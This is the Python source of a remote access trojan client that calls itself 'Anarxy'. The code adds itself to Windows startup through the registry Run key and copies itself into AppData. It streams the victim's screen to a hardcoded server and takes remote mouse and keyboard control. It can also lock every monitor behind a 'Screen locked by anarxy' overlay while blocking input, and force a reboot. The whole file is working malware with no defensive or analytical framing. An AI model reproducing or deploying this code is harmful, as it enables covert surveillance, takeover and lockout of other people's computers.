import socket
import mss
import cv2
import numpy as np
import pickle
import struct
import threading
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController
from pynput.keyboard import Key as PynKey
import tkinter as tk
from PIL import Image, ImageTk
import platform
import ctypes
import subprocess
import os
import requests
from io import BytesIO

try:
    import winreg
except ImportError:
    winreg = None  # Only works on Windows

# === Setup ===
server_ip = '192.168.1.248'
server_port = 9999

mouse = MouseController()
keyboard = KeyboardController()

keymap = {
    "BACKSPACE": PynKey.backspace,
    "ENTER": PynKey.enter,
    "SPACE": PynKey.space,
    "TAB": PynKey.tab,
    "ESC": PynKey.esc,
    "SHIFT": PynKey.shift,
    "CTRL": PynKey.ctrl,
    "ALT": PynKey.alt,
    "CAPSLOCK": PynKey.caps_lock,
    "DELETE": PynKey.delete,
    "UP": PynKey.up,
    "DOWN": PynKey.down,
    "LEFT": PynKey.left,
    "RIGHT": PynKey.right
}

# === Persistence Setup ===
def add_to_startup():
    if platform.system() == "Windows" and winreg:
        try:
            exe_path = os.path.abspath(__file__)
            appdata = os.getenv("APPDATA")
            install_dir = os.path.join(appdata, "AnarxyClient")
            os.makedirs(install_dir, exist_ok=True)
            target_path = os.path.join(install_dir, "client.exe")

            if not os.path.exists(target_path):
                # Copy to target location
                import shutil
                shutil.copy2(exe_path, target_path)

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "AnarxyClient", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"[!] Startup reg error: {e}")

# Run persistence on startup
add_to_startup()

# === Lock Screen Setup (same as before) ===
lock_root = None
lock_overlays = []
lock_img_tk = None

def init_lock_root():
    global lock_root
    lock_root = tk.Tk()
    lock_root.withdraw()
    lock_root.mainloop()

threading.Thread(target=init_lock_root, daemon=True).start()

def on_any_event(e): return "break"

def show_lock_screen_gui():
    global lock_overlays, lock_img_tk, lock_root
    if not lock_img_tk:
        try:
            res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
            image = Image.open(BytesIO(res.content)).resize((300, 300))
            lock_img_tk = ImageTk.PhotoImage(image)
        except:
            lock_img_tk = None

    with mss.mss() as sct:
        monitors = sct.monitors[1:]

    for mon in monitors:
        win = tk.Toplevel(lock_root)
        win.overrideredirect(True)
        win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
        win.configure(bg="black")
        win.attributes("-topmost", True)

        win.bind("<Key>", on_any_event)
        win.bind("<Button>", on_any_event)
        win.bind("<Motion>", on_any_event)
        win.bind("<MouseWheel>", on_any_event)

        canvas = tk.Canvas(win, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        canvas.create_text(mon["width"] // 2, int(mon["height"] * 0.25),
                           text="Screen locked by anarxy", fill="white", font=("Arial", 48))

        if lock_img_tk:
            canvas.create_image(mon["width"] // 2, int(mon["height"] * 0.5), image=lock_img_tk)

        lock_overlays.append(win)

    if platform.system() == "Windows":
        try: ctypes.windll.user32.BlockInput(True)
        except: pass

def hide_lock_screen_gui():
    global lock_overlays
    for w in lock_overlays:
        try: w.destroy()
        except: pass
    lock_overlays.clear()
    if platform.system() == "Windows":
        try: ctypes.windll.user32.BlockInput(False)
        except: pass

# === Main RAT Loop ===
s = socket.socket()
s.connect((server_ip, server_port))

with mss.mss() as sct:
    monitor = sct.monitors[1]
    width = monitor["width"]
    height = monitor["height"]

    while True:
        frame_np = np.array(sct.grab(monitor))
        frame = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
        _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
        data = pickle.dumps((encimg, width, height))
        s.sendall(struct.pack(">L", len(data)) + data)

        s.settimeout(0.01)
        try:
            raw = s.recv(4, socket.MSG_PEEK)
            if raw:
                cmd_size = struct.unpack(">L", s.recv(4))[0]
                cmd_data = b''
                while len(cmd_data) < cmd_size:
                    cmd_data += s.recv(cmd_size - len(cmd_data))
                cmd = cmd_data.decode()
                parts = cmd.split(":")

                if parts[0] == "MOVE":
                    mouse.position = (int(parts[1]), int(parts[2]))

                elif parts[0] == "CLICK":
                    mouse.click(Button.left if parts[1].upper() == "LEFT" else Button.right)

                elif parts[0] == "SCROLL":
                    mouse.scroll(0, int(parts[1]))

                elif parts[0] == "XBUTTON":
                    if platform.system() == "Windows":
                        xbtn = 0x0001 if parts[1] == "1" else 0x0002
                        ctypes.windll.user32.mouse_event(0x0080, 0, 0, xbtn, 0)
                        ctypes.windll.user32.mouse_event(0x0100, 0, 0, xbtn, 0)

                elif parts[0] == "KEY":
                    key = keymap.get(parts[1].upper(), parts[1].lower())
                    keyboard.press(key)
                    keyboard.release(key)

                elif parts[0] == "LOCKSCREEN" and lock_root:
                    lock_root.after(0, show_lock_screen_gui)

                elif parts[0] == "UNLOCKSCREEN" and lock_root:
                    lock_root.after(0, hide_lock_screen_gui)

                elif parts[0] == "RESTART":
                    subprocess.call("shutdown /r /t 0", shell=True)

        except socket.timeout:
            continue
